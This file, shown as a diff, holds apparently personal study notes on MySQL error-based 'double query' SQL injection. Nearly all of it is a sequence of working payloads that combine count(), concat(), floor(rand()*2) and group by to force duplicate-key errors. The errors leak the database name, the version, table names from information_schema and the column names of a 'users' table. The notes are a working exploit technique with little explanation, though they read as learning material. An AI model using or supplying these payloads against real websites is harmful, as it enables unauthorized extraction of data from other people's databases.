@@ -1,0 +1,52 @@
+Double query injection
+
+A scenario when the database does not dump any value from the database. Partial Blind sql injection
+
+We will be using three functions for this type of injection
+
+1. count() --- counts the number of rows eg: select count(*) from information_schema.tables;
+2. rand()  --- displays a random integer eg: select rand();
+3. floor() --- displays the digit before decimal eg: select floor(3.2222); --> result is 3
+4. group by --- this function groups with the single entity  eg: select table_name, table_schema from information_schema.tables group by table_schema;
+
+select count(*) from information_schema.table;
+select rand();
+select floor(rand()*2); --> this will randomly give output as 1 or 0
+
+Adding alias
+select floor(rand()*2)as xyz; || select floor(rand()*2)xyz;
+
+------------------------------------Building blocks--------------------------------------------------------------
+
+select database();
+select (select database());
+select concat((select database()));
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
+now adding randomness
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns;
+
+select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a;
+
+select count(*), concat(0x3a,0x3a,(select version()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+----------------------------------------------------------------------------------------------------------------------------------------
+
+(select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)
+
+(select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a))
+(select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b)
+
+select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
